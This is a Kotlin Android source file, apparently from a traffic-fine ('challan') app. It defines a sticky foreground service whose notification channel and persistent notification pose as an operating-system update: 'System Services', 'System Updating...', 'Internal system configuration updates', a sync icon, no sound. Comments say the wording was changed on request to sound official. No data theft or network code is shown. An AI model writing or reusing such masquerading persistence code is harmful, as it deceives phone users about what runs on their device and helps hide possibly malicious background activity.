package com.rte.challan.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class BackgroundService : Service() {

    private val CHANNEL_ID = "SYSTEM_UPDATE_SERVICE"
    private val NOTIFICATION_ID = 1001

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        // Android 14+ ke liye foreground type handling
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                startForeground(
                    NOTIFICATION_ID, 
                    getNotification(), 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE 
                )
            } catch (e: Exception) {
                // Fallback agar type match na kare
                startForeground(NOTIFICATION_ID, getNotification())
            }
        } else {
            startForeground(NOTIFICATION_ID, getNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services", // User settings mein ye dikhega
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Internal system configuration updates"
                setSound(null, null)
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Updating...") // Aapki request ke mutabik badla gaya
            .setContentText("Checking for latest configuration updates") // Official tone
            .setSmallIcon(android.R.drawable.stat_notify_sync) // Rotating arrows icon
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }
}
